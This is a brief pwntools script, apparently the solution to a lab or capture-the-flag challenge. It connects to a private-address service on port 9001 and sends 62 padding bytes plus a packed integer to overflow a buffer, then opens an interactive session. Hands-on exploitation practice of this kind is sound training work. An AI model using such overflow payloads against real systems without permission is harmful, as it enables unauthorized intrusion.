import pwn
from pwnlib.util.net import p32

p = pwn.remote('10.10.22.66','9001')
pwn.context.log_level = 'debug'
p.recv()
p.sendlineafter(':', b'A'*62 + p32(0x1))
p.interactive()
